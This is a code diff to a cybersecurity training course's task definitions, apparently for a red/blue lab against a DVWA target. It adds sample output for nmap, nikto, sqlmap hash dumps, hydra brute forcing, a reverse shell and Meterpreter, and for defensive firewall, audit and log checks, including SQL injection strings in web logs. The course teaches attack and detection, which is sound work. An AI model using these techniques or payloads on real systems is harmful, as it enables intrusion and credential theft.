@@ -333,8 +333,24 @@ const RED_TASKS: Task[] = [
             ],
           },
         ],
-        expectedOutput: 'Port list with service versions',
-        outputExplanation: 'Each row shows PORT, STATE, SERVICE and VERSION — focus on `open` ports and their version strings, which are your candidate entry points.',
+        expectedOutput: `Starting Nmap 7.94 ( https://nmap.org )
+Nmap scan report for 10.10.100.20
+Host is up (0.00038s latency).
+Not shown: 65531 closed tcp ports (conn-refused)
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9
+80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
+8080/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+3306/tcp open  mysql   MySQL 5.7.40
+
+Service detection performed. Nmap done: 1 IP address (1 host up) scanned in 88.14 seconds`,
+        outputHighlights: [
+          { text: 'open', label: 'the only state worth your time. Closed and filtered ports are not entry points; open ones are your candidate targets.' },
+          { text: 'OpenSSH 8.2p1 Ubuntu 4ubuntu0.9', label: 'a full version string. Note it exactly — the version, not just "SSH", is what you look up for known vulnerabilities.' },
+          { text: '8080/tcp open  http', label: 'the DVWA web app port you attack in Week 3. Finding it here is what tells you where to point sqlmap and hydra.' },
+          { text: '1 IP address (1 host up)', label: 'you scanned exactly one host. More than one means you strayed outside the authorised target — a Rules-of-Engagement breach.' },
+        ],
         whatItMeans: 'Discovers all listening network services and their versions.',
         frameworks: ['CIS'],
         producesDeliverable: 'Nmap_Scan.txt',
@@ -357,8 +373,20 @@ const RED_TASKS: Task[] = [
             ],
           },
         ],
-        expectedOutput: 'Vulnerabilities: directory indexing, default files, old software',
-        outputExplanation: 'Lines beginning with `+` are findings — outdated software, exposed directories, or dangerous default files. Each usually cites an OSVDB/CVE reference to research.',
+        expectedOutput: `+ Target IP:          10.10.100.20
++ Target Port:        80
++ Server: Apache/2.4.41 (Ubuntu)
++ /: The anti-clickjacking X-Frame-Options header is not present.
++ /: Server may leak inodes via ETags, header found with file /, fields: 0x2aa6 0x5c9...
++ /icons/README: Apache default file found.
++ /config/: Directory indexing found.
++ 8074 requests: 0 error(s) and 6 item(s) reported on remote host`,
+        outputHighlights: [
+          { text: '+ Server: Apache/2.4.41 (Ubuntu)', label: 'the same version nmap reported. Two tools agreeing is corroboration worth stating in the report, not a duplicate to drop.' },
+          { text: '/config/: Directory indexing found.', label: 'the serious one. A browsable config directory can expose credentials — rank it above the header findings.' },
+          { text: '/icons/README: Apache default file found.', label: 'a leftover default file. Low risk alone, but it confirms the server was never hardened.' },
+          { text: '6 item(s) reported', label: 'the scan completed and found six issues. A run that errors out early leaves your finding list incomplete.' },
+        ],
         whatItMeans: 'Identifies common web misconfigurations and known web vulnerabilities.',
         frameworks: ['OWASP'],
         producesDeliverable: 'Nikto_Report.txt',
@@ -380,8 +408,17 @@ const RED_TASKS: Task[] = [
             ],
           },
         ],
-        expectedOutput: 'SSH allows password auth',
-        outputExplanation: 'The script lists supported methods; seeing `password` means logins can be brute-forced, whereas `publickey` only would be far safer.',
+        expectedOutput: `PORT   STATE SERVICE
+22/tcp open  ssh
+| ssh-auth-methods:
+|   Supported authentication methods:
+|     publickey
+|_    password
+Nmap done: 1 IP address (1 host up) scanned in 0.62 seconds`,
+        outputHighlights: [
+          { text: 'password', label: 'this is the finding. Password auth being accepted is exactly what makes the SSH brute force in Week 3 possible.' },
+          { text: 'publickey', label: 'the safer method. If ONLY this were listed, brute forcing would be pointless — the presence of password alongside it is the weakness.' },
+        ],
         whatItMeans: 'Password auth enabled = brute force risk; SSH key only would be better.',
         frameworks: ['CIS'],
         troubleshooting: '"Host seems down"? Add -Pn. No SSH result? Confirm port 22 is open (from the earlier nmap scan) and the target is reachable. "Failed to resolve"? Use the numeric IP, not a hostname.',
@@ -433,8 +470,23 @@ const RED_TASKS: Task[] = [
             ],
           },
         ],
-        expectedOutput: 'The dvwa.users table dumped — admin, gordonb, … with their password hashes.',
-        outputExplanation: 'sqlmap confirms the id parameter is injectable, then prints the users table with each password hash — hard proof that unsanitized input let you read the database.',
+        expectedOutput: `[INFO] GET parameter 'id' is 'MySQL >= 5.0.12 AND time-based blind' injectable
+[INFO] the back-end DBMS is MySQL
+Database: dvwa
+Table: users
+[5 entries]
++---------+---------+----------------------------------+
+| user    | user_id | password                         |
++---------+---------+----------------------------------+
+| admin   | 1       | 5f4dcc3b5aa765d61d8327deb882cf99 |
+| gordonb | 2       | e99a18c428cb38d5f260853678922e03 |
+| 1337    | 3       | 8d3533d75ae2c3966d7e0d4fcc69216b |
++---------+---------+----------------------------------+`,
+        outputHighlights: [
+          { text: "GET parameter 'id' is", label: 'sqlmap confirming the parameter is injectable. This line is the vulnerability itself — everything below is the consequence.' },
+          { text: 'Table: users', label: 'you reached the database and read a table you were never meant to. This is the exfiltration, proven.' },
+          { text: '5f4dcc3b5aa765d61d8327deb882cf99', label: 'admin’s password hash. This exact unsalted-MD5 value is "password" — worth noting in the report to show how quickly the dump becomes a working login.' },
+        ],
         whatItMeans: 'Demonstrates data exfiltration risk from SQL injection.',
         frameworks: ['OWASP'],
         files: [
@@ -471,8 +523,17 @@ const RED_TASKS: Task[] = [
             ],
           },
         ],
-        expectedOutput: 'A "[8080][http-get-form] host login: admin password: password" line once a guess works.',
-        outputExplanation: 'Hydra prints the PLAINTEXT password it found (for DVWA admin that is "password") — this is the actual login password, not a hash. Weak credential + no lockout, proven.',
+        expectedOutput: `Hydra v9.5 (c) 2023 by van Hauser/THC
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries
+[ATTEMPT] target 10.10.100.20 - login "admin" - pass "123456"
+[ATTEMPT] target 10.10.100.20 - login "admin" - pass "12345"
+[8080][http-get-form] host: 10.10.100.20   login: admin   password: password
+1 of 1 target successfully completed, 1 valid password found`,
+        outputHighlights: [
+          { text: 'login: admin   password: password', label: 'the whole point: a PLAINTEXT working password, not a hash. This is a credential you can log in with right now — weak password plus no lockout, proven.' },
+          { text: '1 valid password found', label: 'the run succeeded. "0 valid passwords" usually means your session cookie or the F= failure string is wrong, not that the password is strong.' },
+          { text: '[ATTEMPT]', label: 'each guess. A flood of these with no lockout is itself the finding — a hardened server would have blocked the account after a few tries.' },
+        ],
         whatItMeans: 'Shows weak password vulnerability and lack of account lockout.',
         frameworks: ['CIS', 'OWASP'],
         files: [
@@ -539,8 +600,18 @@ const RED_TASKS: Task[] = [
             ],
           },
         ],
-        expectedOutput: 'The listener prints a connection from the target; running id returns uid=33(www-data).',
-        outputExplanation: 'When the payload runs, your nc -lvnp 4444 window shows "connect to … from …" and drops you at a shell. id returning uid=33(www-data) confirms remote code execution as the web-server user.',
+        expectedOutput: `$ nc -lvnp 4444
+Listening on 0.0.0.0 4444
+Connection received on 10.10.100.20 46122
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+$ hostname
+dvwa-target`,
+        outputHighlights: [
+          { text: 'Connection received on 10.10.100.20', label: 'the target dialed back to your listener. This line is the moment the reverse shell lands — before it, nothing has happened.' },
+          { text: 'uid=33(www-data)', label: 'the proof of remote code execution. You are now running commands on the target as the web-server user — hard evidence, save it to the proof file.' },
+          { text: 'dvwa-target', label: 'the target’s own hostname, printed by a command you ran on it. Naming the box you landed on removes any doubt about whose shell this is.' },
+        ],
         whatItMeans: 'Demonstrates RCE and full system compromise.',
         frameworks: ['OWASP'],
         producesDeliverable: 'Reverse_Shell_Proof.txt',
@@ -593,8 +664,20 @@ const RED_TASKS: Task[] = [
             ],
           },
         ],
-        expectedOutput: 'Meterpreter session 1 opened; sysinfo + getuid print the target host and user (www-data).',
-        outputExplanation: 'A "Meterpreter session 1 opened" line means the uploaded payload connected back; sysinfo/getuid prove you have interactive code execution on the target through Metasploit.',
+        expectedOutput: `[*] Started reverse TCP handler on 10.10.100.5:4445
+[*] Meterpreter session 1 opened (10.10.100.5:4445 -> 10.10.100.20:39002)
+
+meterpreter > sysinfo
+Computer     : dvwa-target
+OS           : Linux dvwa-target 5.15.0 x86_64
+Meterpreter  : php/linux
+meterpreter > getuid
+Server username: www-data`,
+        outputHighlights: [
+          { text: 'Meterpreter session 1 opened', label: 'the uploaded shell.php connected back to your handler. No session line means the payload never ran — check LHOST and the upload path.' },
+          { text: 'Server username: www-data', label: 'interactive code execution as the web-server user, through Metasploit. This is what turns an unrestricted file upload into remote control.' },
+          { text: 'Meterpreter  : php/linux', label: 'confirms the session type matches the php/meterpreter payload you built. A mismatch here is why a session sometimes dies instantly.' },
+        ],
         whatItMeans: 'Shows a full exploit framework can turn an unrestricted file upload into remote control.',
         frameworks: ['OWASP', 'NIST_800_115'],
         producesDeliverable: 'Metasploit_Proof.txt',
@@ -838,8 +921,19 @@ const BLUE_TASKS: Task[] = [
           { cmd: 'mkdir -p ~/team-artifacts/week-1', explain: 'Make the week-1 folder to save your evidence into (safe to run again).' },
           { cmd: 'sudo ufw status verbose > ~/team-artifacts/week-1/UFW_Status.txt', explain: 'Save the active firewall rules to a file as evidence. > writes the output to that file.' },
         ],
-        expectedOutput: 'UFW enabled, status shows SSH and HTTP allowed',
-        outputExplanation: '`Firewall is active and enabled on system startup` confirms it is on; `ufw status` should then list only 22 and 80 as ALLOW.',
+        expectedOutput: `Status: active
+Logging: on (low)
+Default: deny (incoming), allow (outgoing), disabled (routed)
+
+To                         Action      From
+--                         ------      ----
+22                         ALLOW IN    Anywhere
+80                         ALLOW IN    Anywhere`,
+        outputHighlights: [
+          { text: 'Status: active', label: 'the firewall is actually on. If this reads "inactive" the rules below exist but are enforcing nothing — the most common way this step looks done but isn’t.' },
+          { text: 'deny (incoming)', label: 'the default that makes this hardening. Everything is blocked unless a rule below opens it — the opposite of a machine that trusts all inbound traffic.' },
+          { text: '22                         ALLOW IN', label: 'SSH is still allowed, so you keep your own access. This must be present before you enable, or you lock yourself out.' },
+        ],
         whatItMeans: 'Restricts inbound traffic to only necessary services. Log this change in the Change Log form.',
         frameworks: ['CIS'],
         usesForm: 'Change Log',
@@ -881,8 +975,19 @@ const BLUE_TASKS: Task[] = [
           { flag: 'lynis audit system', meaning: 'Run a full local security audit.' },
           { flag: '| tee ~/team-artifacts/week-1/Lynis_Report.txt', meaning: 'Show and save the audit output to the canonical file.' },
         ],
-        expectedOutput: 'Hardening index score, warnings list',
-        outputExplanation: 'The end shows a `Hardening index` (0–100) plus `Warnings` and `Suggestions` — the index tracks your progress and the warnings are your to-do list.',
+        expectedOutput: `[+] Results
+  Warnings (2):
+  ! Consider hardening SSH configuration [SSH-7408]
+  ! Reboot needed to load a newer kernel [KRNL-5830]
+
+  Hardening index : 67 [############        ]
+  Tests performed : 261
+  Lynis modules   : done`,
+        outputHighlights: [
+          { text: 'Hardening index : 67', label: 'your single score out of 100. Write it down — its whole value is comparing before and after your changes, so a lone number proves nothing without the pair.' },
+          { text: 'Warnings (2)', label: 'your prioritised to-do list. Warnings outrank Suggestions; fix these first and the index climbs fastest.' },
+          { text: 'SSH-7408', label: 'a test ID. Quote it in the report — "harden SSH [SSH-7408]" is auditable, "make SSH better" is not.' },
+        ],
         whatItMeans: 'Identifies remaining security gaps and compliance issues.',
         frameworks: ['NIST_CSF'],
         producesDeliverable: 'Lynis_Report.txt',
@@ -913,8 +1018,18 @@ const BLUE_TASKS: Task[] = [
             ],
           },
         ],
-        expectedOutput: 'All three profiles show Enabled: True',
-        outputExplanation: 'Open Windows_Firewall.txt — Domain/Private/Public should each read `Enabled : True`.',
+        expectedOutput: `Name                            : Domain
+Enabled                         : True
+
+Name                            : Private
+Enabled                         : True
+
+Name                            : Public
+Enabled                         : True`,
+        outputHighlights: [
+          { text: 'Enabled                         : True', label: 'this must read True for all three profiles. A single "False" — most often Public — is an open door on the exact network you least trust.' },
+          { text: 'Public', label: 'the profile that matters most. It applies on untrusted networks, so it is the one an attacker is most likely to meet.' },
+        ],
         whatItMeans: 'The Windows host now blocks unsolicited inbound traffic, like UFW does on Ubuntu.',
         frameworks: ['CIS'],
         producesDeliverable: 'Windows_Firewall.txt',
@@ -1075,8 +1190,17 @@ const BLUE_TASKS: Task[] = [
             ],
           },
         ],
-        expectedOutput: 'Win_EventLog.txt with recent logon events (Event ID 4624/4625)',
-        outputExplanation: 'Event ID 4624 = successful logon, 4625 = failed logon. Capturing these now means Red’s brute-force attempts will show up next week.',
+        expectedOutput: `TimeCreated           Id  Message
+-----------           --  -------
+8/5/2026 9:58:12 AM  4624 An account was successfully logged on...
+8/5/2026 9:57:41 AM  4625 An account failed to log on...
+8/5/2026 9:57:39 AM  4625 An account failed to log on...
+8/5/2026 9:55:03 AM  4672 Special privileges assigned to new logon...`,
+        outputHighlights: [
+          { text: '4624', label: 'a successful logon. Knowing this ID now is what lets you separate "someone got in" from "someone tried" when you read these logs under pressure next week.' },
+          { text: '4625', label: 'a failed logon. A burst of these from one source is the Windows signature of the brute force Red runs in Week 3 — this is the event you are enabling logging to catch.' },
+          { text: 'TimeCreated', label: 'events must have real timestamps. If this table is empty, auditing was not actually on when the logons happened — the first line enabling it has to run before, not after.' },
+        ],
         whatItMeans: 'Windows now records who logs in (and who fails), the basis for detection.',
         frameworks: ['NIST_CSF', 'NIST_800_115'],
         producesDeliverable: 'Win_EventLog.txt',
@@ -1177,8 +1301,13 @@ const BLUE_TASKS: Task[] = [
           { flag: '-i', meaning: 'Case-insensitive match.' },
           { flag: 'union\\|select', meaning: 'Match either SQL keyword (\\| means OR).' },
         ],
-        expectedOutput: 'SQL keywords in request URLs',
-        outputExplanation: 'Any matching line contains `UNION`/`SELECT` inside a URL — legitimate users never send SQL, so these confirm an injection attempt and give you the attacker IP.',
+        expectedOutput: `10.10.100.5 - - [05/Aug/2026:11:03:02 +0000] "GET /vulnerabilities/sqli/?id=1' UNION SELECT user,password FROM users-- &Submit=Submit HTTP/1.1" 200 4821
+10.10.100.5 - - [05/Aug/2026:11:03:05 +0000] "GET /vulnerabilities/sqli/?id=1' OR '1'='1&Submit=Submit HTTP/1.1" 200 1136`,
+        outputHighlights: [
+          { text: 'UNION SELECT user,password FROM users', label: 'the injection itself, sitting in a URL. No legitimate visitor ever sends SQL — a single match here confirms the attack attempt.' },
+          { text: '10.10.100.5', label: 'the attacker’s IP, the same on both lines. This is what you feed into containment and into the incident report.' },
+          { text: '200', label: 'the server answered the injected request instead of rejecting it. A 200 on a line like this is the difference between "attempted" and "the app processed it".' },
+        ],
         whatItMeans: 'Confirms SQL injection attack attempt. Write up the incident in the Incident Report form.',
         frameworks: ['OWASP', 'NIST_800_61'],
         usesForm: 'Incident Report',
@@ -1233,8 +1362,17 @@ const BLUE_TASKS: Task[] = [
             ],
           },
         ],
-        expectedOutput: 'Win_Detection.txt lists repeated 4625 events; firewall rule created',
-        outputExplanation: 'Many 4625 events from one IP in a short window = a brute-force attempt; the new Block rule stops further attempts from that address.',
+        expectedOutput: `TimeCreated           Id  Message
+-----------           --  -------
+8/5/2026 11:04:57 AM 4625 An account failed to log on... Account Name: admin
+8/5/2026 11:04:56 AM 4625 An account failed to log on... Account Name: admin
+8/5/2026 11:04:56 AM 4625 An account failed to log on... Account Name: admin
+8/5/2026 11:04:55 AM 4625 An account failed to log on... Account Name: admin`,
+        outputHighlights: [
+          { text: '4625', label: 'the failed-logon event. One is normal; a wall of them like this is the brute force. The pattern, not any single line, is the detection.' },
+          { text: 'Account Name: admin', label: 'the same account hammered repeatedly — a guessing attack, not a user fat-fingering their password. This is what justifies blocking the source.' },
+          { text: '11:04:5', label: 'four failures inside three seconds. That rate is impossible by hand and is the clearest tell that this is automated.' },
+        ],
         whatItMeans: 'You detected and contained the attack on the Windows host, mirroring the Linux response.',
         frameworks: ['NIST_CSF', 'NIST_800_61'],
         producesDeliverable: 'Win_Detection.txt',
